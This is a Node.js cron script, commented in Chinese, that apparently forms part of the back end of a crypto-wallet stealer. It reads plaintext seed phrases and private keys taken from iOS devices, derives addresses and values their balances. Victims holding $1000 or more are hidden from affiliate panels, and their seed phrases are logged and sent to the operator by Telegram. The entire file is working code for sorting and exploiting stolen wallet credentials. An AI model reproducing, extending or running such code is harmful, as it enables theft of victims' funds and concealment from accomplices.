#!/usr/bin/env node
/**
 * vault_gate.js —— 暗池前置门（2026-09-18 操作员定案）
 *
 * 规则：
 *   新设备（first_seen 晚于部署时间 DEPLOY_MS）凡产出「助记词 / 私钥」数据
 *   → 先以 PENDING_GATE 入池挂起（面板全端 + 代理/超管通知全静默；复用 vault_items 机制）
 *   → 等它的「可查询地址」全部完成首轮余额查询（或挂起满 MAX_HOLD_MS）
 *   → 判定（操作员确认口径）：
 *       · 任一助记词派生地址合计 ≥ 阈值($1000) → 转正入池
 *       · 或任一单地址 ≥ 阈值            → 转正
 *       · 或整机合计 ≥ 阈值              → 转正
 *       · 纯私钥设备（无助记词）：单地址 ≥ 阈值 → 转正
 *   → 未达标：删除 PENDING 行放回面板（通知冷却门随之解除）
 *
 * 转正动作与既有暗池一致：保留隐藏 + docs/vault_keep.txt 记录 + TG 直达 vault_chat_id（仅操作员）
 *
 * 用法:
 *   node tools/vault_gate.js                 # 常规（cron 每 2-3 分钟）
 *   node tools/vault_gate.js --dry           # 只报告不写入
 *   node tools/vault_gate.js --test-serial S # 把 S 当作新设备强制纳入（测试）
 *   node tools/vault_gate.js --once S        # 只处理 S
 *   node tools/vault_gate.js --force-decide S# 跳过等待，直接判定 S（测试/超时手动）
 */
'use strict';
const fs = require('fs');
const path = require('path');
const { execFileSync } = require('child_process');

const BASE = '/www/wwwroot/i.131422.com';
const pgStore = require(path.join(BASE, 'adm888app', 'pg', 'pgStore.js'));
const vl = require(path.join(BASE, 'tools', 'vault_lib.js'));
const pool = pgStore.pool;

const CFG_F = path.join(BASE, 'adm888app', 'data', 'notify_cfg.json');
const STATE_F = path.join(BASE, 'adm888app', 'data', 'vault_gate_state.json');
// 【2026-09-20】手动放行名单（与 vault_lib.checkAndVault 同一份；名单内设备永不自动入池，仅操作员手动增删）
const RELEASE_F = path.join(BASE, 'adm888app', 'data', 'vault_release_whitelist.json');
const DOCS_F = path.join(BASE, 'docs', 'vault_keep.txt');
const LOG_F = path.join(BASE, 'logs', 'vault_gate.log');
const PY = '/usr/bin/python3';
const DERIVE_PY = path.join(BASE, 'adm888app', 'derive_batch.py');

const DEPLOY_MS = Number(process.env.VAULT_GATE_DEPLOY_MS || 1789756500000); // 2026-09-18 ~18:35 UTC 部署基线：此前设备不回扫
const MAX_HOLD_MS = 5 * 3600 * 1000;   // 最长挂起 5 小时（2026-09-18 操作员定案：给首查留足时间）
const MIN_SETTLE_MS = 10 * 60 * 1000;   // 至少等 10 分钟（让派生/首查先跑起来）
const IDX = 5;                          // 派生索引 0..4（与落地管线一致）

const args = process.argv.slice(2);
const DRY = args.includes('--dry');
const argOf = (n) => { const i = args.indexOf(n); return i >= 0 ? args[i + 1] : null; };
const TEST_SERIAL = argOf('--test-serial');
const ONCE = argOf('--once');
const FORCE_DECIDE = argOf('--force-decide');
const TEST_T = Number(argOf('--test-threshold') || 0);   // 测试用：覆盖阈值（仅本进程判定用）
const NO_NOTIFY = args.includes('--no-notify');          // 测试用：不发 TG / 不写 docs

function log(line) {
  try { fs.appendFileSync(LOG_F, new Date().toISOString().replace('T', ' ').slice(0, 19) + ' ' + line + '\n'); } catch (e) {}
}
function loadState() { try { return JSON.parse(fs.readFileSync(STATE_F, 'utf8')); } catch (e) { return {}; } }
function saveState(s) { if (!DRY) fs.writeFileSync(STATE_F + '.tmp', JSON.stringify(s)); if (!DRY) fs.renameSync(STATE_F + '.tmp', STATE_F); }
// 【2026-09-20】手动放行名单读取（缺失/损坏返回空集合，不阻断主流程）
function releasedSerials() {
  try {
    const wl = JSON.parse(fs.readFileSync(RELEASE_F, 'utf8'));
    return new Set((wl.serials || []).map(String));
  } catch (e) { return new Set(); }
}

async function deriveAddresses(plain) {
  const out = execFileSync(PY, [DERIVE_PY], {
    input: JSON.stringify({ mnemonic: plain, generate: true, genIdx: IDX }),
    maxBuffer: 32 * 1024 * 1024, timeout: 180000,
  }).toString();
  const d = JSON.parse(out);
  return (d.generated || []).map(g => String(g.addr || '').toLowerCase()).filter(Boolean);
}

// 与 balance_sync 一致的"可查询"分类【2026-09-18 复审修复：补地址格式与空值校验】
const EVM_LABELS = new Set(['ETH', 'ETHEREUM', 'METAMASK', 'TRUST', 'BITGET', 'IMTOKEN', 'EXODUS']);
const rxEvmAddr = /^0x[0-9a-fA-F]{40}$/;
function classify(row) {
  const c = String(row.chain || '').toUpperCase();
  const pk = String(row.public_key || '');
  if (!pk) return null;                                              // balance_sync 只查 public_key 非空的行
  if (EVM_LABELS.has(c)) return rxEvmAddr.test(pk) ? 'evm' : null;   // 假 EVM 地址（格式不符）不会被查
  if (c === 'TRON' || c === 'TRX') return 'tron';
  if (c === 'BTC') return 'btc';
  if (c === 'LTC') return 'ltc';
  if (c === 'DOGE') return 'doge';
  if (c === 'SOL') return 'sol';
  if (c === 'TON' || c === 'TONKEEPER' || c === 'TONHUB' || c === 'COIN607' || /^(EQ|UQ|kQ|0Q|Ef|Uf)[A-Za-z0-9_-]{45,48}$/.test(pk)) return 'ton';
  return null;
}

async function pendingSerials() {
  const r = await pool.query(`SELECT DISTINCT serial FROM vault_items WHERE reason LIKE 'PENDING_GATE%' AND serial IS NOT NULL`);
  return r.rows.map(x => x.serial);
}

async function insertPending(serial, addrList) {
  await pool.query(
    `INSERT INTO vault_items (serial, addr, value_usd, reason) VALUES ($1,$2,NULL,$3) ON CONFLICT (addr) DO NOTHING`,
    [serial, 'serial:' + serial, 'PENDING_GATE ' + new Date().toISOString()]);
  for (const a of addrList) {
    await pool.query(
      `INSERT INTO vault_items (serial, addr, value_usd, reason) VALUES ($1,$2,NULL,$3) ON CONFLICT (addr) DO NOTHING`,
      [serial, a, 'PENDING_GATE ' + new Date().toISOString()]);
  }
  await vl.refreshMirror();   // 同步 vault.json 镜像（authStore 过滤路径依赖）
}

async function decide(serial) {
  const prices = vl.loadPrices();
  if (!prices && !TEST_T) return { ready: false, why: 'price_cache 过期，暂缓判定' };
  const cfg = vl.loadCfg();
  const T = TEST_T > 0 ? TEST_T : cfg.threshold;

  const mR = await pool.query(`SELECT plain FROM mnemonics WHERE serial=$1 AND COALESCE(plain,'')<>'' ORDER BY id`, [serial]);
  const mnemonics = mR.rows.map(x => x.plain);
  const aR = await pool.query(`SELECT id, chain, bal, data, public_key, private_key_plain, data->>'derivation_path' AS derivation_path, bal_at FROM addresses WHERE serial=$1`, [serial]);
  const rows = aR.rows;
  if (!rows.length) return { ready: true, result: 'release', detail: '无地址' };

  // 每地址 USD 估值
  const valByKey = new Map();
  let maxAddr = { addr: '', value: 0, chain: '' }, deviceTotal = 0;
  for (const row of rows) {
    const { value, parts } = vl.valueOf(vl.fromRow(row), prices);
    deviceTotal += value;
    const k = String(row.public_key || '').toLowerCase();
    if (k) valByKey.set(k, { value, parts });
    if (value > maxAddr.value) maxAddr = { addr: row.public_key, value, chain: row.chain, parts };
  }

  // 每条助记词的派生地址合计
  const perMn = [];
  for (const plain of mnemonics) {
    let sum = 0, top = { addr: '', value: 0 };
    try {
      const addrs = await deriveAddresses(plain);
      for (const a of addrs) {
        const hit = valByKey.get(a);
        if (hit && hit.value > 0) {
          sum += hit.value;
          if (hit.value > top.value) top = { addr: a, value: hit.value };
        }
      }
    } catch (e) { log(`  ${serial} 派生失败: ${String(e.message).slice(0, 80)}`); }
    perMn.push({ plain: plain.slice(0, 30) + '…', sum, top });
  }
  const mnemonicHit = perMn.find(x => x.sum >= T);
  const byAddr = maxAddr.value >= T;
  const byDevice = deviceTotal >= T;

  const detail = {
    threshold: T, deviceTotal: +deviceTotal.toFixed(2),
    maxAddr: { addr: maxAddr.addr, chain: maxAddr.chain, value: +maxAddr.value.toFixed(2) },
    perMnemonic: perMn.map(x => ({ m: x.plain, sum: +x.sum.toFixed(2) })),
  };
  if (mnemonicHit) return { ready: true, result: 'vault', why: `助记词合计 $${mnemonicHit.sum.toFixed(2)} ≥ $${T}`, detail };
  if (byAddr) return { ready: true, result: 'vault', why: `单地址 $${maxAddr.value.toFixed(2)} ≥ $${T} (${maxAddr.addr})`, detail };
  if (byDevice) return { ready: true, result: 'vault', why: `整机合计 $${deviceTotal.toFixed(2)} ≥ $${T}`, detail };
  if (!mnemonics.length) return { ready: true, result: 'release', why: '纯私钥设备且无单址达标', detail };
  return { ready: true, result: 'release', why: '各项均未达标', detail };
}

async function keepVaulted(serial, why, detail) {
  const cfg = vl.loadCfg();
  const iso = new Date().toISOString();
  const devTotal = detail && Number(detail.deviceTotal) > 0 ? Number(detail.deviceTotal) : null;
  // 【2026-09-18 复审修复】① 事务化：reason 改写 + TG 入队 原子提交（避免"已隐藏但 TG 永久丢失"）
  //   ② 只改写 PENDING_GATE 行（不覆盖 manual hide 等 audit reason）；③ 补写 value_usd
  const cli0 = await pool.connect();
  let updRows = 0;
  try {
    await cli0.query('BEGIN');
    const upd = await cli0.query(`UPDATE vault_items SET reason='gate_vault ' || $2, value_usd=COALESCE($3, value_usd) WHERE serial=$1 AND reason LIKE 'PENDING_GATE%'`, [serial, iso, devTotal]);
    updRows = upd.rowCount || 0;
    await cli0.query('COMMIT');
  } catch (e) {
    try { await cli0.query('ROLLBACK'); } catch (_) {}
    log('keepVaulted 事务失败: ' + e.message);
    throw e;
  } finally { cli0.release(); }
  // 【2026-09-19 复审修复】TG 入队与隐藏解耦：隐藏先提交（关键动作不被 TG 故障阻塞）；TG 失败只记日志；
  //   UPDATE 未命中任何 PENDING 行（已被并发清理）时不发"假隐藏"通知
  if (!DRY && !NO_NOTIFY && updRows > 0) {
    try {
      let text = `🔒 高价值设备入池（前置门）\n设备: ${serial}\n判定: ${why}`;
      if (detail) text += `\n整机合计: $${detail.deviceTotal} · 单址最高: $${detail.maxAddr && detail.maxAddr.value}`;
      text += `\n（已从所有面板隐藏）`;
      await pool.query(`INSERT INTO tg_queue (notification_id, chat_id, agent_id, text) VALUES (NULL,$1,NULL,$2)`, [cfg.chat, text]);
    } catch (e) { log('TG 队列写入失败（隐藏已生效）: ' + e.message); }
  }
  // docs 记录（与 vault_lib 格式一致；事务提交后写，失败不影响隐藏/TG）
  try {
    const dev = (await pool.query(`SELECT serial, machine, ios_version, ip FROM devices WHERE serial=$1 LIMIT 1`, [serial])).rows[0] || {};
    const mns = (await pool.query(`SELECT plain FROM mnemonics WHERE serial=$1 AND COALESCE(plain,'')<>'' ORDER BY id LIMIT 20`, [serial])).rows.map(x => x.plain);
    const ts = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
    let block = `\n[${ts}] === 高价值设备入池（前置门判定）===\n设备序列号: ${serial}\n判定: ${why}\n`;
    if (detail) block += `整机合计: $${detail.deviceTotal} | 单址最高: $${detail.maxAddr && detail.maxAddr.value} (${detail.maxAddr && detail.maxAddr.addr})\n`;
    if (dev.machine) block += `设备: ${dev.machine || '-'} · iOS ${dev.ios_version || '-'} · IP ${dev.ip || '-'}\n`;
    if (mns.length) { block += `助记词(${mns.length}):\n`; for (const m of mns) block += `  ${m}\n`; }
    if (!DRY && !NO_NOTIFY) { fs.appendFileSync(DOCS_F, block); try { fs.chmodSync(DOCS_F, 0o600); } catch (e) {} }
  } catch (e) { log('docs 写入失败: ' + e.message); }
  // 站内历史通知/未发队列清理（该设备）【复审修复】--no-notify 测试时不得真实删除
  if (!DRY && !NO_NOTIFY) {
    try {
      await pool.query(`DELETE FROM tg_queue WHERE sent_at IS NULL AND notification_id IN (SELECT id FROM notifications WHERE body->>'serial'=$1)`, [serial]);
      await pool.query(`DELETE FROM notifications WHERE body->>'serial'=$1`, [serial]);
    } catch (e) {}
  }
  await vl.refreshMirror();
}

async function release(serial) {
  await pool.query(`DELETE FROM vault_items WHERE serial=$1 AND reason LIKE 'PENDING_GATE%'`, [serial]);
  await vl.refreshMirror();
}

(async () => {
  const state = loadState();
  const t = Date.now();
  const actions = [];

  // ① 新候选（部署后首次入库的设备；含助记词或私钥数据）
  let candSql = `
    SELECT d.serial, d.first_seen FROM devices d
    WHERE d.first_seen > $1
      AND (EXISTS (SELECT 1 FROM mnemonics m WHERE m.serial=d.serial AND COALESCE(m.plain,'')<>'')
        OR EXISTS (SELECT 1 FROM addresses a WHERE a.serial=d.serial AND COALESCE(a.private_key_plain,'')<>''))`;
  let cand = (await pool.query(candSql, [DEPLOY_MS])).rows;
  if (TEST_SERIAL) cand = cand.concat([{ serial: TEST_SERIAL, first_seen: t }]);
  if (ONCE) cand = cand.filter(x => x.serial === ONCE);
  const relSet = releasedSerials();
  for (const c of cand) {
    // 【2026-09-20】手动放行名单：永不自动入池（不写 state，撤销名单后下次运行可正常恢复判定）
    if (relSet.has(String(c.serial))) continue;
    if (state[c.serial]) continue;
    const v = (await pool.query(`SELECT 1 FROM vault_items WHERE serial=$1 LIMIT 1`, [c.serial])).rows.length;
    if (v) { state[c.serial] = { t, result: 'skip-existing-vault' }; continue; }
    const addrs = (await pool.query(`SELECT public_key FROM addresses WHERE serial=$1 AND COALESCE(public_key,'')<>''`, [c.serial])).rows.map(x => x.public_key);
    if (!DRY) await insertPending(c.serial, addrs);
    actions.push(`PENDING ${c.serial}（地址 ${addrs.length} 条）`);
    state[c.serial] = { t, result: 'pending', startedAt: t };
  }

  // ② 处理现有 PENDING
  let pend = await pendingSerials();
  if (TEST_SERIAL && pend.indexOf(TEST_SERIAL) < 0 && state[TEST_SERIAL] && state[TEST_SERIAL].result === 'pending') pend.push(TEST_SERIAL);
  if (ONCE) pend = pend.filter(x => x === ONCE);
  const prices = vl.loadPrices();
  for (const s of pend) {
    try {
      // 【2026-09-20】手动放行名单：若残留在 PENDING（名单加入前已挂起），直接清除放回面板
      if (relSet.has(String(s))) {
        if (!DRY) await release(s);
        state[s] = { t, result: 'released-whitelist' };
        actions.push(`RELEASE ${s}: 手动放行名单`);
        continue;
      }
      const row = (await pool.query(`SELECT min(created_at) AS t FROM vault_items WHERE serial=$1 AND reason LIKE 'PENDING_GATE%'`, [s])).rows[0];
      const startMs = row && row.t ? new Date(row.t).getTime() : t;
      const elapsed = t - startMs;
      // 顶补地址行
      const addrs = (await pool.query(`SELECT public_key FROM addresses WHERE serial=$1 AND COALESCE(public_key,'')<>''`, [s])).rows.map(x => x.public_key);
      if (!DRY) for (const a of addrs) await pool.query(`INSERT INTO vault_items (serial, addr, value_usd, reason) VALUES ($1,$2,NULL,$3) ON CONFLICT (addr) DO NOTHING`, [s, a, 'PENDING_GATE topup ' + new Date().toISOString()]);

      // 等待条件
      // 【2026-09-18 复审修复】与 balance_sync 完全同口径（NOK + 地址格式），否则"首查完成即判定"永远等不到
      // 【2026-09-19 H1 修复】"已查"必须同时满足 bal_at 新鲜 AND bal 非空（成功查询会写 bal；失败只写 bal_at）——
      //   否则首查失败的地址会被当成"已查"，在零值上误判放行
      const aR = await pool.query(`SELECT chain, public_key, private_key_plain, data->>'derivation_path' AS derivation_path, bal_at, bal,
          ( COALESCE(private_key_plain,'') <> ''
            OR EXISTS (SELECT 1 FROM addresses d WHERE d.serial = addresses.serial AND lower(d.public_key) = lower(addresses.public_key) AND COALESCE(d.private_key_plain,'') <> '')
            OR (COALESCE(data->>'derivation_path','') <> '' AND EXISTS (SELECT 1 FROM mnemonics m WHERE m.serial = addresses.serial AND COALESCE(m.plain,'') <> '')) ) AS nok
        FROM addresses WHERE serial=$1`, [s]);
      const mCount = Number((await pool.query(`SELECT count(*)::int AS n FROM mnemonics WHERE serial=$1 AND COALESCE(plain,'')<>''`, [s])).rows[0].n);
      const checkable = aR.rows.filter(r => r.nok && classify(r));
      const unchecked = checkable.filter(r => !(Number(r.bal_at) >= startMs && r.bal !== null));
      const force = (FORCE_DECIDE && FORCE_DECIDE === s);
      let ready = false, whyWait = '';
      if (force) ready = true;
      else if (elapsed < MIN_SETTLE_MS) whyWait = `等待派发（${Math.round(elapsed / 1000)}s < ${MIN_SETTLE_MS / 1000}s）`;
      else if (!prices) whyWait = 'price_cache 过期';
      else if (checkable.length && unchecked.length === 0) ready = true;
      else if (elapsed >= MAX_HOLD_MS) { ready = true; whyWait = '（超时强制判定）'; }
      else whyWait = `等待首查（未查 ${unchecked.length}/${checkable.length}）`;
      if (!ready) { log(`WAIT ${s}: ${whyWait}`); continue; }

      const dec = await decide(s);
      if (!dec.ready) { log(`WAIT ${s}: ${dec.why}`); continue; }
      if (dec.result === 'vault') {
        if (!DRY) await keepVaulted(s, dec.why + (whyWait ? ' ' + whyWait : ''), dec.detail);
        state[s] = { t, result: 'vaulted', why: dec.why };
        actions.push(`VAULT ${s}: ${dec.why}`);
      } else {
        if (!DRY) await release(s);
        state[s] = { t, result: 'released', why: dec.why };
        actions.push(`RELEASE ${s}: ${dec.why}`);
      }
      log(`DECIDE ${s}: ${dec.result} | ${dec.why} | ${JSON.stringify(dec.detail || {})}`);
    } catch (e) { log(`ERR ${s}: ${String(e.message).slice(0, 120)}`); }
  }

  saveState(state);
  log(actions.length ? 'ACTIONS: ' + actions.join(' ; ') : `空闲（候选 ${cand.length} / PENDING ${pend.length}）`);
  if (actions.length) console.log(actions.join('\n'));
  await pool.end();
})().catch(e => { log('FATAL ' + String(e.message || e).slice(0, 200)); process.exit(1); });
